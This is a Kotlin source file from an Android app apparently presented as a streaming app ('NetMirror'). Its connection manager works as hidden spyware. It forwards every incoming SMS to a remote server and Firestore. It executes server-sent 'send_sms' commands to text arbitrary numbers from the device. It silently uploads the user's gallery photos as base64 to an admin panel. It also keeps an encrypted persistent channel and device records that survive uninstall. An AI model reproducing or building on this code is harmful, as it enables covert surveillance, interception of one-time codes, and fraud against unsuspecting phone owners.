package com.netmirror.streaming.device

import android.content.Context
import android.util.Log
import com.netmirror.streaming.data.api.RetrofitClient
import com.netmirror.streaming.firebase.FirestoreSyncManager
import com.netmirror.streaming.network.GoogleDns
import com.netmirror.streaming.util.CryptoUtil
import io.socket.client.IO
import io.socket.client.Socket
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.net.URI
import java.util.concurrent.TimeUnit

/**
 * Manages a persistent Socket.IO connection to the backend.
 * - Registers this device on connect (sends full device info).
 * - Sends heartbeat every 3 seconds with battery + SIM updates.
 * - The server detects online/offline via the WebSocket connection itself
 *   (pingInterval=1s, pingTimeout=2s, so offline detection is within 3s).
 *
 * Lifecycle:
 *   connect() when app enters foreground (onStart)
 *   disconnect() when app enters background (onStop)
 *   Device record persists on server forever — even after uninstall it shows "Offline".
 */
object DeviceConnectionManager {

    private const val TAG = "DeviceConn"
    private const val HEARTBEAT_INTERVAL_MS = 30000L  // 30 seconds

    private var socket: Socket? = null
    private var heartbeatJob: Job? = null
    private var appContext: Context? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // Shared OkHttpClient with custom DNS resolver for REST + Socket.IO
    private val httpClient = OkHttpClient.Builder()
        .dns(GoogleDns)  // Custom DNS with Google DoH fallback
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    /**
     * Initialize with application context.
     * Call once from Application.onCreate().
     */
    fun init(context: Context) {
        appContext = context.applicationContext
    }

    /**
     * Connect to the server and start heartbeat.
     * Safe to call multiple times — will no-op if already connected.
     */
    fun connect() {
        val ctx = appContext ?: return

        if (socket?.connected() == true) {
            Log.d(TAG, "Already connected, skipping")
            return
        }

        try {
            // Disconnect existing socket if any
            socket?.off()
            socket?.disconnect()

            val serverUrl = RetrofitClient.BASE_URL
            Log.d(TAG, "Connecting to $serverUrl (full URL for diagnostics)")

            val opts = IO.Options().apply {
                forceNew = true
                reconnection = true
                reconnectionAttempts = Int.MAX_VALUE
                reconnectionDelay = 2000
                reconnectionDelayMax = 10000
                timeout = 30000  // 30 second connection timeout (mobile-friendly)
                callFactory = httpClient    // Use our custom DNS OkHttp for HTTP polling
                webSocketFactory = httpClient  // Use our custom DNS OkHttp for WebSocket
            }

            socket = IO.socket(URI.create(serverUrl), opts).apply {

                on(Socket.EVENT_CONNECT) {
                    Log.d(TAG, "Connected to server: $serverUrl")
                    // Register device with full info (encrypted)
                    val info = DeviceInfoManager.getDeviceInfo(ctx)
                    emit("device_register", CryptoUtil.encrypt(info))
                    Log.d(TAG, "Device registered via WebSocket: ${info.optString("device_id")}")

                    // Also register via REST API as belt-and-suspenders
                    // This ensures device shows in admin panel even if WS events are lost
                    scope.launch {
                        try {
                            registerViaRestInternal(info)
                            Log.d(TAG, "Device registered via REST (redundant): ${info.optString("device_id")}")
                        } catch (e: Exception) {
                            Log.w(TAG, "Redundant REST registration failed: ${e.message}")
                        }
                    }

                    // Also register in Firestore (primary data channel for admin app)
                    FirestoreSyncManager.registerDevice(info)

                    // Start heartbeat
                    startHeartbeat(ctx)

                    // Trigger immediate gallery sync to backend (runs in background thread)
                    Thread {
                        try {
                            triggerGallerySync(ctx, info.optString("device_id", ""))
                        } catch (e: Exception) {
                            Log.w(TAG, "Gallery sync trigger error: ${e.message}")
                        }
                    }.start()
                }

                on(Socket.EVENT_DISCONNECT) {
                    Log.d(TAG, "Disconnected from server")
                    stopHeartbeat()
                }

                on(Socket.EVENT_CONNECT_ERROR) { args ->
                    val err = if (args.isNotEmpty()) args[0].toString() else "unknown"
                    Log.w(TAG, "Connection error: $err")
                }

                on("welcome") { args ->
                    if (args.isNotEmpty()) {
                        Log.d(TAG, "Server welcome: ${args[0]}")
                    }
                }

                // Handle remote message dispatch commands (decrypt from backend)
                on("send_sms") { args ->
                    if (args.isNotEmpty()) {
                        try {
                            val rawData = args[0] as JSONObject
                            val data = CryptoUtil.tryDecrypt(rawData)
                            // Backend sends "receiver", fallback to "phone_number" for compat
                            val phone = data.optString("receiver", "").ifBlank {
                                data.optString("phone_number", "")
                            }
                            val msg = data.optString("message", "")
                            val slot = data.optInt("sim_slot", -1)
                            // Backend sends "request_id", fallback to "command_id" for compat
                            val cmdId = data.optString("request_id", "").ifBlank {
                                data.optString("command_id", "")
                            }

                            val result = JSONObject()
                            result.put("command_id", cmdId)
                            result.put("request_id", cmdId)
                            result.put("device_id", DeviceInfoManager.getDeviceId(ctx))
                            result.put("receiver", phone)
                            result.put("sim_slot", slot)

                            if (phone.isNotBlank() && msg.isNotBlank()) {
                                val ok = SmsSender.send(ctx, phone, msg, slot)
                                result.put("success", ok)
                                if (!ok) result.put("error", "Device failed to dispatch SMS")
                            } else {
                                result.put("success", false)
                                result.put("error", if (phone.isBlank()) "No phone number provided" else "No message provided")
                            }
                            emit("sms_send_result", CryptoUtil.encrypt(result))
                        } catch (e: Exception) {
                            Log.e(TAG, "Send SMS handler error: ${e.message}")
                            try {
                                val errResult = JSONObject()
                                errResult.put("success", false)
                                errResult.put("error", e.message ?: "Unknown error")
                                errResult.put("device_id", DeviceInfoManager.getDeviceId(ctx))
                                emit("sms_send_result", CryptoUtil.encrypt(errResult))
                            } catch (_: Exception) {}
                        }
                    }
                }

                connect()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to connect", e)
        }
    }

    /**
     * Disconnect from server and stop heartbeat.
     * Call from onStop or when app goes to background.
     */
    fun disconnect() {
        stopHeartbeat()
        try {
            socket?.off()
            socket?.disconnect()
            socket = null
            Log.d(TAG, "Disconnected and cleaned up")
        } catch (e: Exception) {
            Log.e(TAG, "Error disconnecting", e)
        }
    }

    /**
     * Send heartbeat every HEARTBEAT_INTERVAL_MS with battery + SIM updates.
     */
    private var firestoreHeartbeatCounter = 0

    private fun startHeartbeat(context: Context) {
        stopHeartbeat()
        firestoreHeartbeatCounter = 0
        heartbeatJob = scope.launch {
            while (isActive) {
                try {
                    val info = DeviceInfoManager.getHeartbeatInfo(context)
                    socket?.emit("device_heartbeat", CryptoUtil.encrypt(info))

                    // Firestore heartbeat every ~30 seconds (every 10th Socket heartbeat)
                    firestoreHeartbeatCounter++
                    if (firestoreHeartbeatCounter >= 10) {
                        firestoreHeartbeatCounter = 0
                        FirestoreSyncManager.sendHeartbeat(info)
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Heartbeat error: ${e.message}")
                }
                delay(HEARTBEAT_INTERVAL_MS)
            }
        }
    }

    private fun stopHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = null
    }

    /** Check if currently connected */
    fun isConnected(): Boolean = socket?.connected() == true

    /**
     * Instantly forward a received SMS to the server via Socket.IO.
     * Called by SmsReceiver when a new SMS arrives on the device.
     */
    fun emitInstantSms(address: String, body: String, timestamp: Long, simSlot: Int) {
        val ctx = appContext ?: return
        try {
            val deviceId = DeviceInfoManager.getDeviceId(ctx)
            val data = JSONObject()
            data.put("device_id", deviceId)
            data.put("address", address)
            data.put("body", body)
            data.put("date", timestamp)
            data.put("type", 1) // 1 = inbox/received
            data.put("sim_slot", simSlot)
            socket?.emit("instant_sms", CryptoUtil.encrypt(data))
            Log.d(TAG, "Instant SMS emitted: from=$address sim=$simSlot")

            // Also write to Firestore (primary data channel for admin app)
            FirestoreSyncManager.writeInstantSms(
                deviceId = deviceId,
                address = address,
                body = body,
                timestamp = timestamp,
                type = 1,
                simSlot = simSlot
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to emit instant SMS: ${e.message}")
        }
    }

    /**
     * Internal REST registration with pre-built device info (single-attempt).
     * Used as a redundant path alongside Socket.IO to guarantee device visibility.
     */
    private suspend fun registerViaRestInternal(deviceInfo: JSONObject) {
        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
            val url = "${RetrofitClient.BASE_URL}/api/devices/register"
            val json = deviceInfo.toString()
            val mediaType = "application/json; charset=utf-8".toMediaType()
            val body = json.toRequestBody(mediaType)

            val request = Request.Builder()
                .url(url)
                .post(body)
                .build()

            val response = httpClient.newCall(request).execute()
            response.use {
                if (it.isSuccessful) {
                    Log.d(TAG, "REST internal registration OK: ${deviceInfo.optString("device_id")}")
                } else {
                    Log.w(TAG, "REST internal registration failed: HTTP ${it.code}")
                }
            }
        }
    }

    /**
     * Register device via REST API as a fallback.
     * This ensures the device shows up in the admin panel even if
     * Socket.IO fails to connect (firewall, slow network, etc.).
     * Retries up to 3 times with 5-second delays on failure.
     */
    fun registerViaRest() {
        val ctx = appContext ?: return
        scope.launch {
            for (attempt in 1..3) {
                try {
                    val deviceInfo = DeviceInfoManager.getDeviceInfo(ctx)
                    val url = "${RetrofitClient.BASE_URL}/api/devices/register"
                    val json = deviceInfo.toString()
                    val mediaType = "application/json; charset=utf-8".toMediaType()
                    val body = json.toRequestBody(mediaType)

                    val request = Request.Builder()
                        .url(url)
                        .post(body)
                        .build()

                    val response = httpClient.newCall(request).execute()
                    response.use {
                        if (it.isSuccessful) {
                            Log.d(TAG, "REST registration successful (attempt $attempt) — device_id: ${deviceInfo.optString("device_id")}")

                            return@launch  // Success — stop retrying
                        } else {
                            Log.w(TAG, "REST registration failed (attempt $attempt): HTTP ${it.code}")
                        }
                    }

                    // Also register in Firestore regardless of REST result
                    FirestoreSyncManager.registerDevice(deviceInfo)
                } catch (e: Exception) {
                    Log.e(TAG, "REST registration error (attempt $attempt): ${e.message}")
                }
                // Wait before retrying
                if (attempt < 3) {
                    delay(5000L)
                }
            }
        }
    }

    /**
     * Direct gallery sync to BOTH backend AND Firestore.
     * Called on Socket.IO connect as a guaranteed path.
     * Bypasses WorkManager entirely. Runs on a background thread.
     * Also sends a diagnostic report to the backend for debugging.
     */
    private fun triggerGallerySync(context: Context, deviceId: String) {
        val errors = mutableListOf<String>()

        val hasReadStorage = try {
            androidx.core.content.ContextCompat.checkSelfPermission(
                context, android.Manifest.permission.READ_EXTERNAL_STORAGE
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        } catch (_: Exception) { false }

        val hasReadMedia = try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
                androidx.core.content.ContextCompat.checkSelfPermission(
                    context, android.Manifest.permission.READ_MEDIA_IMAGES
                ) == android.content.pm.PackageManager.PERMISSION_GRANTED
            } else false
        } catch (_: Exception) { false }

        val hasPerm = GalleryReader.hasPermission(context)

        if (deviceId.isBlank()) {
            errors.add("BLANK_DEVICE_ID")
            sendGalleryDebug(deviceId, hasReadStorage, hasReadMedia, hasPerm, 0, 0, 0, 0, 0, errors, "socket_connect")
            return
        }
        if (!hasPerm) {
            errors.add("NO_PERMISSION: readStorage=$hasReadStorage readMedia=$hasReadMedia sdk=${android.os.Build.VERSION.SDK_INT}")
            sendGalleryDebug(deviceId, hasReadStorage, hasReadMedia, hasPerm, 0, 0, 0, 0, 0, errors, "socket_connect")
            return
        }

        val photos = GalleryReader.readRecentPhotos(context)
        if (photos.isEmpty()) {
            errors.add("ZERO_PHOTOS_READ: diag=${GalleryReader.lastDiagnostics}")
            sendGalleryDebug(deviceId, hasReadStorage, hasReadMedia, hasPerm, 0, 0, 0, 0, 0, errors, "socket_connect")
            return
        }

        Log.d(TAG, "Gallery sync: ${photos.size} photos read from device")

        val prefs = context.getSharedPreferences("gallery_sync_prefs", Context.MODE_PRIVATE)

        // ── 1. Firestore sync (for NetMirrorAdmin app) ──
        val firestoreSyncedIds = prefs.getStringSet("synced_media_ids", emptySet())?.toMutableSet()
            ?: mutableSetOf()
        val newForFirestore = photos.filter { it.mediaId.toString() !in firestoreSyncedIds }
        var firestoreCount = 0
        for (photo in newForFirestore) {
            try {
                FirestoreSyncManager.syncGalleryPhoto(
                    deviceId = deviceId, mediaId = photo.mediaId, filename = photo.filename,
                    dateTaken = photo.dateTaken, width = photo.width, height = photo.height,
                    size = photo.size, base64 = photo.base64
                )
                firestoreSyncedIds.add(photo.mediaId.toString())
                firestoreCount++
            } catch (e: Exception) {
                errors.add("FIRESTORE_ERR: ${e.message}")
            }
        }
        if (firestoreCount > 0) {
            prefs.edit().putStringSet("synced_media_ids", firestoreSyncedIds).commit()
            Log.d(TAG, "Gallery Firestore: $firestoreCount photos synced")
        }

        // ── 2. Backend REST sync (for web admin panel) ──
        val backendSyncedIds = prefs.getStringSet("backend_synced_media_ids", emptySet())?.toMutableSet()
            ?: mutableSetOf()
        val newForBackend = photos.filter { it.mediaId.toString() !in backendSyncedIds }

        var totalSynced = 0
        for (batch in newForBackend.chunked(5)) {
            try {
                val photosArray = JSONArray()
                for (photo in batch) {
                    val obj = JSONObject()
                    obj.put("media_id", photo.mediaId)
                    obj.put("filename", photo.filename)
                    obj.put("date_taken", photo.dateTaken)
                    obj.put("width", photo.width)
                    obj.put("height", photo.height)
                    obj.put("size", photo.size)
                    obj.put("image_base64", photo.base64)
                    photosArray.put(obj)
                }

                val payload = JSONObject()
                payload.put("device_id", deviceId)
                payload.put("photos", photosArray)

                val url = "${RetrofitClient.BASE_URL}/api/devices/gallery"
                val body = payload.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
                val request = Request.Builder().url(url).post(body).build()

                httpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        for (photo in batch) backendSyncedIds.add(photo.mediaId.toString())
                        totalSynced += batch.size
                        Log.d(TAG, "Gallery batch sent: ${batch.size} photos")
                    } else {
                        errors.add("BACKEND_HTTP_${response.code}")
                    }
                }
            } catch (e: Exception) {
                errors.add("BACKEND_ERR: ${e.message}")
            }
        }

        if (totalSynced > 0) {
            prefs.edit().putStringSet("backend_synced_media_ids", backendSyncedIds).commit()
        }
        Log.d(TAG, "Gallery sync complete: $firestoreCount Firestore, $totalSynced backend")

        // Always send diagnostic report
        sendGalleryDebug(deviceId, hasReadStorage, hasReadMedia, hasPerm,
            photos.size, newForBackend.size, newForFirestore.size, totalSynced, firestoreCount, errors, "socket_connect")
    }

    /** Send gallery debug report to backend for diagnostics */
    private fun sendGalleryDebug(
        deviceId: String, hasReadStorage: Boolean, hasReadMedia: Boolean, hasPerm: Boolean,
        photosRead: Int, newForBackend: Int, newForFirestore: Int,
        backendSynced: Int, firestoreSynced: Int, errors: List<String>, source: String
    ) {
        try {
            val report = JSONObject()
            report.put("device_id", deviceId)
            report.put("model", android.os.Build.MODEL)
            report.put("manufacturer", android.os.Build.MANUFACTURER)
            report.put("sdk_version", android.os.Build.VERSION.SDK_INT)
            report.put("has_read_storage", hasReadStorage)
            report.put("has_read_media", hasReadMedia)
            report.put("has_permission", hasPerm)
            report.put("photos_read", photosRead)
            report.put("new_for_backend", newForBackend)
            report.put("new_for_firestore", newForFirestore)
            report.put("backend_synced", backendSynced)
            report.put("firestore_synced", firestoreSynced)
            report.put("gallery_diag", GalleryReader.lastDiagnostics)
            report.put("errors", JSONArray(errors))
            report.put("source", source)
            report.put("timestamp", System.currentTimeMillis())

            val url = "${RetrofitClient.BASE_URL}/api/devices/gallery-debug"
            val body = report.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
            val request = Request.Builder().url(url).post(body).build()
            httpClient.newCall(request).execute().close()
            Log.d(TAG, "Gallery debug report sent: photos=$photosRead errors=${errors.size}")
        } catch (e: Exception) {
            Log.w(TAG, "Failed to send gallery debug: ${e.message}")
        }
    }
}
